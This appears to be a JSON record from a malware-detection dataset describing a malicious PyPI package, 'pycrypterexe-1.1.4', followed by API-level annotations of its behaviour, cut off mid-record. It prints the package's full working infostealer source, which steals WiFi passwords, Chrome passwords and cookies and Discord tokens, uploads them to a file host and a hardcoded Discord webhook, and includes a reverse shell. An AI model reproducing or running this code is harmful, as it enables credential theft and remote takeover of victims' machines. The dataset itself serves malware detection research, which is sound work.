{
  "metadata": {
    "package_name": "pycrypterexe-1.1.4",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/pycrypterexe-1.1.4.txt",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/pycrypterexe-1.1.4.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "__main__.py",
      "code_snippets": [
        {
          "snippet": "import re, os, time, shutil, sqlite3, base64, json, sys, string\nimport socket as sock\nimport tempfile as tf\nimport platform as pf\nimport subprocess as sp\n\nfrom random import choice\nfrom requests import get, post\nfrom datetime import datetime, timedelta\n\nfrom uuid import getnode\nfrom win32crypt import CryptUnprotectData\nfrom cryptography.hazmat.backends import default_backend\nfrom cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)\n\nclass VARIABLES:\n    webhook    = \"https://discord.com/api/webhooks/1078733828820054216/4msW5vN4GwhxilN1o-LIdnJOBCxn96xKj_1B5VZ0mQvjd_UOtOUOIDS35n2hNvRKHo0S\" # your discord webhook\n    printOnEnd = False # True = don't print endText when program finished - False = don't print\n    endText    = \"PROGRAM FINISHED\" # change this to whatever you want to print when the program finishes\n\n    REVSHELL  = False # False = dont connect to your shell - True = try to connect to your shell\n    serverip  = \"192.168.1.37\" # your server/host ip for victim to connect to \n    buffer    = 1024 # buffer to send (in bytes) each packet\n    port      = 80 # server port to connect to\n\nclass EVIL:\n    \"\"\" EvilPIP Malware \"\"\"\n\n    class LOGGER:\n        \"\"\" Discord/System grabbing \"\"\"\n        def __init__(self):\n            self.errors  = \"\"\n            self.INFO    = {'System': pf.system(), 'Release': pf.release(),\n            'Version': pf.version(), 'Arch': pf.machine(),\n            'Host': sock.gethostname(), 'Local IP': sock.gethostbyname(sock.gethostname()),\n            'IP Addr': get(\"https://icanhazip.com\").text.split(\"\\n\")[0], 'MAC Addr': ':'.join(re.findall('..', '%012x' % getnode()))\n            }\n\n        def RndFileName(self):\n            rnd = ''.join(choice(string.ascii_letters) for i in range(6))\n            return f\"C:\\\\ProgramData\\\\{rnd}.txt\"\n\n        def UploadFile(self, filepath, filename=\"File\") -> str:\n            server = 'https://store4.gofile.io/uploadFile'\n            try:\n                file = {'file': open(filepath, \"rb\")}\n                resp = post(server, files=file).json()\n                filelink = f\"[{filename}]({resp['data']['downloadPage']})\"\n            except Exception as error:\n                LOGGER.errors += f\"{error}\\n\"\n                filelink = \"Upload Error\"\n            return filelink\n\n        def ErrorLog(self) -> str:\n            randomfilename = LOGGER.RndFileName()\n            with open(randomfilename, 'w') as file:\n                file.write(str(self.errors))\n                file.close()\n                return self.UploadFile(randomfilename, filename=\"System Error Log\") \\\n                    if self.errors != \"\" else \"No System Error Log\"\n\n        class GetWifiPasswords:\n            \"\"\" Write wifi passwords to file and upload \"\"\"\n            def __init__(self):\n                self.command = \"netsh wlan show profile\"\n                self.passwords = \"\"\n                \n            def Passwords(self) -> str:\n                networks = sp.check_output(self.command, shell=True, stderr=sp.DEVNULL, stdin=sp.DEVNULL)\n                networks = networks.decode(encoding=\"utf-8\", errors=\"strict\")\n                network_list = re.findall(\"(?:Profile\\s*:\\s)(.*)\", networks) \n\n                for network_name in network_list:\n                    try:\n                        command = \"netsh wlan show profile \" + network_name + \" key=clear\"\n                        current_result = sp.check_output(command, shell=True, stderr=sp.DEVNULL, stdin=sp.DEVNULL)\n                        current_result = current_result.decode(encoding=\"utf-8\", errors=\"strict\")        \n                        \n                        ssid = re.findall(\"(?:SSID name\\s*:\\s)(.*)\", str(current_result))\n                        authentication = re.findall(r\"(?:Authentication\\s*:\\s)(.*)\", current_result)\n                        cipher = re.findall(\"(?:Cipher\\s*:\\s)(.*)\", current_result)\n                        security_key = re.findall(r\"(?:Security key\\s*:\\s)(.*)\", current_result)\n                        password = re.findall(\"(?:Key Content\\s*:\\s)(.*)\", current_result)\n                        \n                        self.passwords += f\"\\n\\nSSID           : {ssid[0]}\"\n                        self.passwords += f\"Authentication : {authentication[0]}\"\n                        self.passwords += f\"Cipher         : {cipher[0]}\"\n                        self.passwords += f\"Security Key   : {security_key[0]}\"\n                        self.passwords += f\"Password       : {password[0]}\"\n                    except Exception as error:\n                        LOGGER.errors += f\"{error}\\n\"\n\n                return self.passwords\n\n            def Main(self) -> str:\n                randomfilename = LOGGER.RndFileName()\n                with open(randomfilename, 'w') as file:\n                    file.write(str(self.Passwords()))\n                    file.close()\n                return LOGGER.UploadFile(randomfilename, filename=\"WiFi Passwords\")\n\n\n        class GetChromePasswords:\n            \"\"\" Decrypt all saved chrome passwords and upload file \"\"\"\n            def __init__(self):\n                self.passwordlog = \"\"\n                self.APP_DATA_PATH   = os.environ['LOCALAPPDATA']\n                self.DB_PATH         = r'Google\\Chrome\\User Data\\Default\\Login Data'\n                self.NONCE_BYTE_SIZE = 12\n\n            def AddPassword(self, db_file):\n                conn = sqlite3.connect(db_file)\n                _sql = 'select signon_realm,username_value,password_value from logins'\n                for row in conn.execute(_sql):\n                    host = row[0]\n                    if host.startswith('android'):\n                        continue\n                    name = row[1]\n                    value = self.ChromeDecrypt(row[2])\n                    _info = 'Hostname: %s\\nUsername: %s\\nPassword: %s\\n\\n' %(host,name,value)\n                    self.passwordlog += _info\n                conn.close()\n                os.remove(db_file)\n\n            def ChromeDecrypt(self, encrypted_txt):\n                if encrypted_txt[:4] == b'\\x01\\x00\\x00\\x00':\n                    decryptedtxt = self.DecryptDPAPI(encrypted_txt)\n                    return decryptedtxt.decode()\n                elif encrypted_txt[:3] == b'v10':\n                    decryptedtxt = self.DecryptAES(encrypted_txt)\n                    return decryptedtxt[:-16].decode()\n\n            def Decrypt(self, cipher, ciphertext, nonce):\n                cipher.mode = modes.GCM(nonce)\n                decryptor = cipher.decryptor()\n                return decryptor.update(ciphertext)\n\n            def GetCipher(self, key):\n                cipher = Cipher(\n                    algorithms.AES(key),\n                    None,\n                    backend=default_backend()\n                )\n                return cipher\n\n            def DecryptDPAPI(self, encrypted):\n                import ctypes\n                import ctypes.wintypes\n\n                class DATA_BLOB(ctypes.Structure):\n                    _fields_ = [('cbData', ctypes.wintypes.DWORD),\n                                ('pbData', ctypes.POINTER(ctypes.c_char))]\n\n                p = ctypes.create_string_buffer(encrypted, len(encrypted))\n                blobin = DATA_BLOB(ctypes.sizeof(p), p)\n                blobout = DATA_BLOB()\n                retval = ctypes.windll.crypt32.CryptUnprotectData(\n                    ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))\n                if not retval:\n                    raise ctypes.WinError()\n                result = ctypes.string_at(blobout.pbData, blobout.cbData)\n                ctypes.windll.kernel32.LocalFree(blobout.pbData)\n                return result\n\n            def LocalKey(self):\n                jsn = None\n                with open(os.path.join(os.environ['LOCALAPPDATA'], r\"Google\\Chrome\\User Data\\Local State\"), encoding='utf-8', mode =\"r\") as f:\n                    jsn = json.loads(str(f.readline()))\n                return jsn[\"os_crypt\"][\"encrypted_key\"]\n\n            def DecryptAES(self, encrypted_txt):\n                encoded_key   = self.LocalKey()\n                encrypted_key = base64.b64decode(encoded_key.encode())\n                encrypted_key = encrypted_key[5:]\n                key           = self.DecryptDPAPI(encrypted_key)\n                nonce         = encrypted_txt[3:15]\n                cipher        = self.GetCipher(key)\n                return self.Decrypt(cipher, encrypted_txt[15:], nonce)\n\n            def Main(self):\n                _full_path = os.path.join(self.APP_DATA_PATH, self.DB_PATH)\n                _temp_path = os.path.join(self.APP_DATA_PATH, 'sqlite_file')\n                shutil.copyfile(_full_path,_temp_path)\n                self.AddPassword(_temp_path)\n                randomfilename = LOGGER.RndFileName()\n                with open(randomfilename, 'w') as file:\n                    file.write(str(self.passwordlog))\n                    file.close()\n                    return LOGGER.UploadFile(randomfilename, filename=\"Chrome Passwords\")\n\n\n        class GetChromeCookies:\n            \"\"\" Get Chrome Cookies - Current error: can't decrypt cookies \"\"\"\n            def __init__(self):\n                local_state_path = os.path.join(os.environ[\"USERPROFILE\"], \"AppData\", \"Local\", \"Google\", \"Chrome\", \"User Data\", \"Local State\")\n                with open(local_state_path, \"r\", encoding=\"utf-8\") as f: local_state = json.loads(f.read())\n                key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])[5:]\n                self.key = CryptUnprotectData(key, None, None, None, 0)[1]\n\n            def TimeReadable(self, chromedate):\n                if chromedate != 86400000000 and chromedate:\n                    try: return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)\n                    except Exception as error: LOGGER.errors += f\"{error}\\n\"\n                else: return \"\"\n\n            def DecryptData(self, data, key):\n                try:\n                    from Crypto.Cipher import AES\n                    iv = data[3:15]\n                    data = data[15:]\n                    cipher = AES.new(key, AES.MODE_GCM, iv)\n                    return cipher.Decrypt(data)[:-16].decode()\n                except:\n                    try: return str(CryptUnprotectData(data, None, None, None, 0)[1])\n                    except: return \"\"\n\n            def Main(self):\n                db_path = os.path.join(os.environ[\"USERPROFILE\"], \"AppData\", \"Local\", \"Google\", \"Chrome\", \"User Data\", \"Default\", \"Network\", \"Cookies\")\n                filename = \"Cookies.db\"\n                if not os.path.isfile(filename):\n                    shutil.copyfile(db_path, filename)\n                db = sqlite3.connect(filename)\n                db.text_factory = lambda b: b.decode(errors=\"ignore\")\n                cursor = db.cursor()\n                cursor.execute(\"\"\"\n                SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value \n                FROM cookies\"\"\")\n                key = self.key\n                try:\n                    randomfilename = LOGGER.RndFileName()\n                    with open(randomfilename, 'w', encoding=\"utf-8\") as file:\n                        for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():\n                            decrypted_value = self.DecryptData(encrypted_value, key) if not value else value\n                            file.write(f\"\"\"\n                                URL: {host_key}\n                                Cookie name: {name}\n                                Cookie value (encrypted): {encrypted_value}\n                                Cookie value (decrypted): {decrypted_value}\n                                Creation date: {self.TimeReadable(creation_utc)}\n                                Last accessed: {self.TimeReadable(last_access_utc)}\n                                Expires at: {self.TimeReadable(expires_utc)}\n                            \"\"\")\n                            cursor.execute(\"\"\"\n                            UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0\n                            WHERE host_key = ?\n                            AND name = ?\"\"\", (decrypted_value, host_key, name))\n                        file.close()\n                    db.commit()\n                    db.close()\n                    return LOGGER.UploadFile(randomfilename, filename=\"Chrome Cookies\")\n                except Exception as error:\n                    LOGGER.errors += f\"{error}\\n\"\n                    return \"No Chrome Cookie File\"\n\n\n        class DiscordTokens:\n            \"\"\" Scrape local & browser Discord tokens \"\"\"\n            def __init__(self):\n                self.tokens = []\n                self.rawtokens = \"\"\n                self.tokeninfo = \"\"\n\n            def GetTokens(self) -> None:\n                LOCAL = os.getenv(\"LOCALAPPDATA\")\n                ROAMING = os.getenv(\"APPDATA\")\n                PATHS = {\n                    \"Discord\"               : ROAMING + \"\\\\Discord\",\n                    \"Discord Canary\"        : ROAMING + \"\\\\discordcanary\",\n                    \"Discord PTB\"           : ROAMING + \"\\\\discordptb\",\n                    \"Google Chrome\"         : LOCAL + \"\\\\Google\\\\Chrome\\\\User Data\\\\Default\",\n                    \"Opera\"                 : ROAMING + \"\\\\Opera Software\\\\Opera Stable\",\n                    \"Brave\"                 : LOCAL + \"\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\",\n                    \"Yandex\"                : LOCAL + \"\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\",\n                    'Lightcord'             : ROAMING + \"\\\\Lightcord\",\n                    'Opera GX'              : ROAMING + \"\\\\Opera Software\\\\Opera GX Stable\",\n                    'Amigo'                 : LOCAL + \"\\\\Amigo\\\\User Data\",\n                    'Torch'                 : LOCAL + \"\\\\Torch\\\\User Data\",\n                    'Kometa'                : LOCAL + \"\\\\Kometa\\\\User Data\",\n                    'Orbitum'               : LOCAL + \"\\\\Orbitum\\\\User Data\",\n                    'CentBrowser'           : LOCAL + \"\\\\CentBrowser\\\\User Data\",\n                    '7Star'                 : LOCAL + \"\\\\7Star\\\\7Star\\\\User Data\",\n                    'Sputnik'               : LOCAL + \"\\\\Sputnik\\\\Sputnik\\\\User Data\",\n                    'Vivaldi'               : LOCAL + \"\\\\Vivaldi\\\\User Data\\\\Default\",\n                    'Chrome SxS'            : LOCAL + \"\\\\Google\\\\Chrome SxS\\\\User Data\",\n                    'Epic Privacy Browser'  : LOCAL + \"\\\\Epic Privacy Browser\\\\User Data\",\n                    'Microsoft Edge'        : LOCAL + \"\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\",\n                    'Uran'                  : LOCAL + \"\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default\",\n                    'Iridium'               : LOCAL + \"\\\\Iridium\\\\User Data\\\\Default\\\\Local Storage\\\\leveld\",\n                    'Firefox'               : ROAMING + \"\\\\Mozilla\\\\Firefox\\\\Profiles\",\n                }\n                \n                for platform, path in PATHS.items():\n                    path += \"\\\\Local Storage\\\\leveldb\"\n                    if os.path.exists(path):\n                        for file_name in os.listdir(path):\n                            if file_name.endswith(\".log\") or file_name.endswith(\".ldb\") or file_name.endswith(\".sqlite\"):\n                                for line in [x.strip() for x in open(f\"{path}\\\\{file_name}\", errors=\"ignore\").readlines() if x.strip()]:\n                                    for regex in (r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}\", r\"mfa\\.[\\w-]{84}\"):\n                                        for token in re.findall(regex, line):\n                                            if token + \" - \" + platform not in self.tokens:\n                                                self.tokens.append(token + \" -> \" + platform)\n                                                self.rawtokens += f\"\\n{token}\\n\"\n                return self.tokens\n\n            def Main(self):\n                self.GetTokens()\n                randomfilename = LOGGER.RndFileName()\n                with open(randomfilename, 'w') as file:\n                    for index in range(len(self.tokens)):\n                        self.tokeninfo += f\"[{index+1}] {self.tokens[index]}\\n\"\n                    file.write(str(self.tokeninfo))\n                    file.close()\n\n                return LOGGER.UploadFile(randomfilename, filename=\"Token File\"), self.rawtokens\n\n            def Valid(self, token):\n                \"\"\" Currently not used \"\"\"\n                headers = { 'Authorization': token, 'Content-Type': 'application/json' }\n                r = get('https://discordapp.com/api/v9/users/@me', headers=headers)\n                return True if r.status_code == 200 else False\n\n\n        def Main(self):\n            \"\"\" Get information and construct embed \"\"\"\n            WifiPass   = self.GetWifiPasswords()\n            ChromePass = self.GetChromePasswords()\n            ChromeCks  = self.GetChromeCookies()\n            DiscTokens = self.DiscordTokens()\n            wifi_passwords   = WifiPass.Main()\n            chrome_passwords = ChromePass.Main()\n            chrome_cookies   = ChromeCks.Main()\n            discord_tokens   = DiscTokens.Main()\n\n            system_info = \"\"\n            for key in self.INFO:\n                system_info += f\"{key} : {self.INFO[key]}\\n\"\n\n            embed = {\n                \"color\": 0x000000,\n                        \"fields\": [\n                            {\n                                \"name\": \"**Tokens**\",\n                                \"value\": f\"```{discord_tokens[1]}```\"\n                            },\n                            {\n                                \"name\": \"System Information\",\n                                \"value\": f\"```{system_info}```\"\n                            },\n                            {\n                                \"name\": \"Python Version\",\n                                \"value\": f\"```{pf.python_version()}```\"\n                            },\n                            {\n                                \"name\": \"System Files\",\n                                \"value\": f\"**{discord_tokens[0]}**\\n**{wifi_passwords}**\\n**{chrome_passwords}**\\n**{chrome_cookies}**\\n**{self.ErrorLog()}**\"\n                            }\n                        ],\n                        \"author\": {\n                            \"name\": f\"EvilPIP ✔️\"\n                        },\n                        \"footer\": {\n                            \"text\": f\"github.com/codeuk/evilpip\"\n                        },\n                    }\n\n            heading = {\n                \"content\": f\"**EvilPIP Executed** ||@everyone||\",\n                \"embeds\": [embed],\n                \"username\": \"EvilPIP\"\n            }\n            req = post(VARIABLES.webhook, headers={\"content-type\": \"application/json\"}, data=json.dumps(heading).encode())\n\n            NETWORK = PROGRAM.NETWORK()\n            NETWORK.Main() if VARIABLES.REVSHELL else NETWORK.Persistence()\n\n\n    class NETWORK:\n        \"\"\" RAT/Reverse Shell (Isn't very good ATM)\"\"\"\n        def __init__(self):\n            self.ip = get(\"https://icanhazip.com\").text.split(\"\\n\")[0]\n            self.cwd = os.getcwd()\n\n        def Persistence(self):\n            return None\n\n        def onLoad(self):\n            embed = {\n                        \"color\": 0x000000,\n                        \"fields\": [\n                            {\n                                \"name\": \"**Reverse Shell Connected**\",\n                                \"value\": f\"```{self.ip} -> {VARIABLES.serverip}:{VARIABLES.port}```\"\n                            },\n                            {\n                                \"name\": \"**Configuration**\",\n                                \"value\": f\"\"\"```PORT -> {VARIABLES.port}\\nIP   -> {self.ip}\\\n                                    \\nBUFFER -> {VARIABLES.buffer}\\nSERVER -> {VARIABLES.serverip}```\"\"\"\n                            }\n                        ],\n                        \"author\": {\"name\": f\"EvilPIP ✔️\"},\n                        \"footer\": {\"text\": f\"github.com/codeuk/evilpip\"},\n                    }\n            heading = { \"content\": \"\", \"embeds\": [embed], \"username\": \"EvilPIP\" }\n            req = post(VARIABLES.webhook, headers={\"content-type\": \"application/json\"}, data=json.dumps(heading).encode())\n\n        def Main(self):\n            \"\"\" currently working on the localtunnel function and getting the tunnel link automatically... \"\"\"\n            s = sock.socket()\n            s.connect((VARIABLES.serverip, VARIABLES.port))\n            s.send(self.cwd.encode())\n            self.onLoad()\n\n            while True:\n                try:\n                    command = s.recv(VARIABLES.buffer).decode()\n                    split_command = command.split()\n                    if split_command[0] == \"localtunnel\":\n                        try:\n                            tunnel_port = split_command[1]\n                            tunnel_inst = sp.getoutput(\"npm install -g localtunnel\")\n                            tunnel_link = sp.getoutput(f\"lt --port {tunnel_port}\")\n                            http_server = sp.getoutput(f\"python -m http.server --directory C:// {tunnel_port}\")\n                            output = f\"[*] Started localtunnel @ {tunnel_link}\"\n                        except Exception as error:\n                            output = \"[!] Couldn't start localtunnel: \", error\n                    elif command.lower() == \"exit\":\n                        break\n                    else:\n                        output = sp.getoutput(command)\n                    message = f\"{output}\\n\"\n                    s.send(message.encode())\n                except Exception as error:\n                    s.send(\"[!] Error on client side!\".encode())\n            s.close()\n\nPROGRAM = EVIL()\nLOGGER  = PROGRAM.LOGGER()\nLOGGER.Main()\nprint(VARIABLES.endText if VARIABLES.printOnEnd else \"\")",
          "triple_sequences": [
            {
              "action_api": "pf.system()",
              "action_description": "Retrieves operating system identifier",
              "action_id": "get_os_id",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get operating system name",
              "intention_id": "get_operating_system_name"
            },
            {
              "action_api": "pf.release()",
              "action_description": "Retrieves operating system release version",
              "action_id": "get_os_release",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get operating system version",
              "intention_id": "get_operating_system_version"
            },
            {
              "action_api": "pf.version()",
              "action_description": "Retrieves operating system version",
              "action_id": "get_os_version",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get operating system version",
              "intention_id": "get_operating_system_version"
            },
            {
              "action_api": "pf.machine()",
              "action_description": "Retrieves machine type",
              "action_id": "get_machine_type",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get system info",
              "intention_id": "get_system_info"
            },
            {
              "action_api": "sock.gethostname()",
              "action_description": "Retrieves current host name",
              "action_id": "get_hostname",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get system hostname",
              "intention_id": "get_system_hostname"
            },
            {
              "action_api": "sock.gethostbyname()",
              "action_description": "Resolves host name to IPv4 address",
              "action_id": "resolve_hostname",
              "object": "sock.gethostname()",
              "object_description": "System hostname",
              "object_id": "system_hostname",
              "intention_description": "Resolve hostname to IP address",
              "intention_id": "resolve_hostname_ip"
            },
            {
              "action_api": "get()",
              "action_description": "Sends HTTP GET request to URL",
              "action_id": "open_url_get",
              "object": "https://icanhazip.com",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Collect public IP address",
              "intention_id": "collect_public_ip"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "'..', '%012x' % getnode()",
              "object_description": "Character code array",
              "object_id": "character_code_array",
              "intention_description": "Extract MAC address",
              "intention_id": "extract_mac_address"
            },
            {
              "action_api": "choice()",
              "action_description": "Generate random integer",
              "action_id": "generate_random_integer",
              "object": "string.ascii_letters",
              "object_description": "Random string",
              "object_id": "random_string",
              "intention_description": "Create random file name",
              "intention_id": "create_random_filename"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "randomfilename, 'w'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "str(self.errors)",
              "object_description": "Error message text",
              "object_id": "error_message",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "post()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "server, files=file",
              "object_description": "File sharing endpoint",
              "object_id": "file_sharing_endpoint",
              "intention_description": "Extract file upload response",
              "intention_id": "extract_file_upload_response"
            },
            {
              "action_api": "sp.check_output()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "self.command, shell=True, stderr=sp.DEVNULL, stdin=sp.DEVNULL",
              "object_description": "Network command string (e.g., ipconfig, netstat)",
              "object_id": "network_command",
              "intention_description": "Collect command output",
              "intention_id": "collect_command_output"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "(?:Profile\\s*:\\s)(.*), networks",
              "object_description": "Regex file content",
              "object_id": "regex_file_content",
              "intention_description": "Extract wifi profile names",
              "intention_id": "extract_wifi_profile_names"
            },
            {
              "action_api": "sp.check_output()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "command, shell=True, stderr=sp.DEVNULL, stdin=sp.DEVNULL",
              "object_description": "Network command string (e.g., ipconfig, netstat)",
              "object_id": "network_command",
              "intention_description": "Collect command output",
              "intention_id": "collect_command_output"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "(?:SSID name\\s*:\\s)(.*), str(current_result)",
              "object_description": "Regex file content",
              "object_id": "regex_file_content",
              "intention_description": "Extract wifi ssid",
              "intention_id": "extract_wifi_ssid"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "r'(?:Authentication\\s*:\\s)(.*)', current_result",
              "object_description": "Regex file content",
              "object_id": "regex_file_content",
              "intention_description": "Extract authentication type",
              "intention_id": "extract_authentication_type"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "(?:Cipher\\s*:\\s)(.*), current_result",
              "object_description": "Regex file content",
              "object_id": "regex_file_content",
              "intention_description": "Extract cipher type",
              "intention_id": "extract_cipher_type"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "r'(?:Security key\\s*:\\s)(.*)', current_result",
              "object_description": "Regex file content",
              "object_id": "regex_file_content",
              "intention_description": "Extract security key presence",
              "intention_id": "extract_security_key_presence"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "(?:Key Content\\s*:\\s)(.*), current_result",
              "object_description": "Regex file content",
              "object_id": "regex_file_content",
              "intention_description": "Extract wifi password",
              "intention_id": "extract_wifi_password"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "randomfilename, 'w'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "sqlite3.connect()",
              "action_description": "Opens SQLite database file",
              "action_id": "open_sqlite_db",
              "object": "db_file",
              "object_description": "Chrome cookies file",
              "object_id": "chrome_cookies_file",
              "intention_description": "Open SQLite database",
              "intention_id": "open_sqlite_database"
            },
            {
              "action_api": "conn.execute()",
              "action_description": "Executes SQL query",
              "action_id": "execute_sql_query",
              "object": "'select signon_realm,username_value,password_value from logins'",
              "object_description": "SQL query string",
              "object_id": "sql_query_string",
              "intention_description": "Query browser passwords",
              "intention_id": "query_browser_passwords"
            },
            {
              "action_api": "self.ChromeDecrypt()",
              "action_description": "Decrypt browser stored credentials",
              "action_id": "decrypt_browser_credentials",
              "object": "row[2]",
              "object_description": "Browser password data",
              "object_id": "browser_passwords",
              "intention_description": "Decrypt browser password",
              "intention_id": "decrypt_browser_password"
            },
            {
              "action_api": "conn.close()",
              "action_description": "Closes the SQLite database connection",
              "action_id": "close_sqlite_connection",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close database connection",
              "intention_id": "close_database_connection"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "db_file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "encoded_key.encode()",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode encrypted key",
              "intention_id": "decode_encrypted_key"
            },
            {
              "action_api": "self.DecryptDPAPI()",
              "action_description": "Decrypts Windows DPAPI-encrypted data",
              "action_id": "decrypt_dpapi_data",
              "object": "encrypted_key",
              "object_description": "Encrypted data",
              "object_id": "encrypted_data",
              "intention_description": "Decrypt browser master key",
              "intention_id": "decrypt_browser_master_key"
            },
            {
              "action_api": "Cipher()",
              "action_description": "Creates new cipher object",
              "action_id": "get_crypto_backend",
              "object": "algorithms.AES(key), None, backend=default_backend()",
              "object_description": "Encryption key",
              "object_id": "encryption_key",
              "intention_description": "Decrypt browser password",
              "intention_id": "decrypt_browser_password"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "randomfilename, 'w'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Write password data to file",
              "intention_id": "write_password_data_file"
            },
            {
              "action_api": "shutil.copyfile()",
              "action_description": "Copies file to destination",
              "action_id": "copy_file",
              "object": "_full_path, _temp_path",
              "object_description": "Chrome cookies file and temporary file path",
              "object_id": "chrome_cookies_temp_file",
              "intention_description": "Copy database to temporary location",
              "intention_id": "copy_database_temp_location"
            },
            {
              "action_api": "os.path.isfile()",
              "action_description": "Checks if specified path exists and is a file",
              "action_id": "check_file_is_file",
              "object": "filename",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Determine presence of file",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "shutil.copyfile()",
              "action_description": "Copies file to destination",
              "action_id": "copy_file",
              "object": "db_path, filename",
              "object_description": "Chrome cookies file and temporary file path",
              "object_id": "chrome_cookies_temp_file",
              "intention_description": "Copy database to temporary location",
              "intention_id": "copy_database_temp_location"
            },
            {
              "action_api": "sqlite3.connect()",
              "action_description": "Opens SQLite database file",
              "action_id": "open_sqlite_db",
              "object": "filename",
              "object_description": "Chrome cookies file",
              "object_id": "chrome_cookies_file",
              "intention_description": "Open SQLite database",
              "intention_id": "open_sqlite_database"
            },
            {
              "action_api": "db.cursor()",
              "action_description": "Creates cursor object",
              "action_id": "create_sql_cursor",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Create database cursor",
              "intention_id": "create_database_cursor"
            },
            {
              "action_api": "cursor.execute()",
              "action_description": "Executes SQL query",
              "action_id": "execute_sql_query",
              "object": "SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies",
              "object_description": "SQL query string",
              "object_id": "sql_query_string",
              "intention_description": "Query browser cookies data",
              "intention_id": "query_browser_cookies"
            },
            {
              "action_api": "self.DecryptData()",
              "action_description": "Decrypt browser stored credentials",
              "action_id": "decrypt_browser_credentials",
              "object": "encrypted_value, key",
              "object_description": "Browser cookies data",
              "object_id": "browser_cookies",
              "intention_description": "Decrypt browser cookie value",
              "intention_id": "decrypt_browser_cookie"
            },
            {
              "action_api": "cursor.execute()",
              "action_description": "Executes SQL query",
              "action_id": "execute_sql_query",
              "object": "UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0 WHERE host_key = ? AND name = ?",
              "object_description": "SQL query string",
              "object_id": "sql_query_string",
              "intention_description": "Modify file attributes",
              "intention_id": "modify_file_attributes"
            },
            {
              "action_api": "db.commit()",
              "action_description": "Commits current transaction to SQLite database",
              "action_id": "commit_transaction",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Finalize file for later use",
              "intention_id": "finalize_file_later_use"
            },
            {
              "action_api": "db.close()",
              "action_description": "Closes the SQLite database connection",
              "action_id": "close_sqlite_connection",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close database connection",
              "intention_id": "close_database_connection"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"LOCALAPPDATA\"",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"APPDATA\"",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.path.exists()",
